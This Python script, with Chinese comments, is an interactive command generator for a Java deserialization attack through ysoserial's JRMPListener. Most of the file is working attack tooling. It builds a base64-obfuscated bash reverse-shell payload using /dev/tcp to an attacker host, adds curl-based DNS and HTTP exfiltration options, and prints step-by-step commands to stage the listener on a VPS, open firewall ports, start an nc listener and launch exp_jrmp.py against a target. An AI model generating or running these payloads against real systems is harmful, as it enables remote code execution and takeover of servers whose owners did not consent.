#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
JRMPListener 命令生成器
生成 VPS 端需要执行的完整命令
"""

import base64
import sys

def generate_shell_payload(vps_ip, vps_port):
    """生成反弹 shell 的 Base64 payload"""
    shell_cmd = f"bash -i >& /dev/tcp/{vps_ip}/{vps_port} 0>&1"
    shell_b64 = base64.b64encode(shell_cmd.encode()).decode()
    payload = f"bash -c {{echo,{shell_b64}}}|{{base64,-d}}|{{bash,-i}}"
    return payload

def generate_curl_payload(url):
    """生成 curl 外带 payload"""
    return f"curl {url}"

def generate_custom_payload(command):
    """生成自定义命令 payload"""
    return command

def main():
    print("=" * 60)
    print("  JRMPListener 命令生成器")
    print("=" * 60)
    print()
    
    # 获取 VPS 配置
    print("VPS 配置:")
    jrmp_ip = input("  JRMPListener IP (运行 ysoserial 的服务器): ").strip()
    jrmp_port = input("  JRMPListener 端口 (默认 1099): ").strip() or "1099"
    
    gadget = input("  使用的 Gadget (默认 Jdk7u21): ").strip() or "Jdk7u21"
    
    print("\n选择 Payload 类型:")
    print("1. 反弹 shell")
    print("2. DNS 外带")
    print("3. HTTP 外带")
    print("4. 自定义命令")
    
    choice = input("\n请选择 [1-4]: ").strip()
    
    if choice == "1":
        print("\n反弹 shell 配置:")
        shell_ip = input("  监听 shell 的 IP: ").strip()
        shell_port = input("  监听 shell 的端口 (默认 4445): ").strip() or "4445"
        payload = generate_shell_payload(shell_ip, shell_port)
        
        print("\n" + "=" * 60)
        print("  步骤 1: 在监听 shell 的服务器上执行")
        print("=" * 60)
        print(f"\nnc -lvnp {shell_port}\n")
        
    elif choice == "2":
        dnslog = input("\n  DNSlog 域名: ").strip()
        payload = generate_curl_payload(f"http://{dnslog}")
        
    elif choice == "3":
        http_url = input("\n  HTTP 外带地址: ").strip()
        payload = generate_curl_payload(http_url)
        
    elif choice == "4":
        payload = input("\n  自定义命令: ").strip()
    
    else:
        print("[!] 无效选项")
        return
    
    # 生成完整命令
    print("\n" + "=" * 60)
    if choice == "1":
        print("  步骤 2: 在 JRMPListener 服务器上执行")
    else:
        print("  步骤 1: 在 VPS 上执行以下命令")
    print("=" * 60)
    
    # 检查是否需要安装 Java
    print("\n# 1. 安装 Java (如果未安装)")
    print("# CentOS/RHEL:")
    print("yum install -y java-11-openjdk")
    print("\n# Ubuntu/Debian:")
    print("apt-get install -y openjdk-11-jdk")
    
    print("\n# 2. 上传 ysoserial.jar (如果没有)")
    print("# 方法 A: 从本地上传")
    print(f"scp ysoserial.jar root@{jrmp_ip}:~/")
    print("\n# 方法 B: 在 VPS 上下载")
    print("wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar -O ysoserial.jar")
    
    print("\n# 3. 配置防火墙")
    print(f"firewall-cmd --zone=public --add-port={jrmp_port}/tcp --permanent")
    print("firewall-cmd --reload")
    print("# 或")
    print(f"ufw allow {jrmp_port}/tcp")
    
    print("\n# 4. 启动 JRMPListener")
    print("-" * 60)
    
    jrmp_cmd = f"java -cp ysoserial.jar ysoserial.exploit.JRMPListener {jrmp_port} {gadget} '{payload}'"
    print(jrmp_cmd)
    print("-" * 60)
    
    # 生成本地攻击命令
    print("\n" + "=" * 60)
    if choice == "1":
        print("  步骤 3: 在本地执行攻击")
    else:
        print("  步骤 2: 在本地执行攻击")
    print("=" * 60)
    
    print(f"\npython exp_jrmp.py {jrmp_ip} {jrmp_port}")
    
    # 或手动使用
    print("\n# 或手动输入:")
    print("python exp_jrmp.py")
    print(f"# VPS IP: {jrmp_ip}")
    print(f"# 端口: {jrmp_port}")
    
    # 保存到文件
    print("\n" + "=" * 60)
    print("  命令已保存到文件")
    print("=" * 60)
    
    with open("jrmp_commands.txt", "w") as f:
        f.write("=" * 60 + "\n")
        f.write("JRMPListener 部署命令\n")
        f.write("=" * 60 + "\n\n")
        
        if choice == "1":
            f.write("步骤 1: 监听反弹 shell\n")
            f.write("-" * 60 + "\n")
            f.write(f"nc -lvnp {shell_port}\n\n")
            f.write("步骤 2: 启动 JRMPListener\n")
        else:
            f.write("步骤 1: 启动 JRMPListener\n")
        
        f.write("-" * 60 + "\n")
        f.write(jrmp_cmd + "\n\n")
        
        if choice == "1":
            f.write("步骤 3: 执行攻击\n")
        else:
            f.write("步骤 2: 执行攻击\n")
        f.write("-" * 60 + "\n")
        f.write(f"python exp_jrmp.py {jrmp_ip} {jrmp_port}\n\n")
        
        f.write("配置信息:\n")
        f.write(f"  JRMPListener: {jrmp_ip}:{jrmp_port}\n")
        f.write(f"  Gadget: {gadget}\n")
        f.write(f"  Payload: {payload[:50]}...\n")
    
    print("\n[+] 命令已保存到: jrmp_commands.txt")
    
    # 复制到剪贴板 (可选)
    try:
        import pyperclip
        pyperclip.copy(jrmp_cmd)
        print("[+] VPS 命令已复制到剪贴板")
    except:
        pass
    
    print("\n" + "=" * 60)
    print("💡 提示:")
    print("  1. 先在 VPS 上执行 JRMPListener 命令")
    print("  2. 确保防火墙已开放端口")
    print("  3. 然后在本地执行 exp_jrmp.py")
    print("  4. 查看 VPS 日志是否收到连接")
    print("=" * 60)


if __name__ == "__main__":
    main()
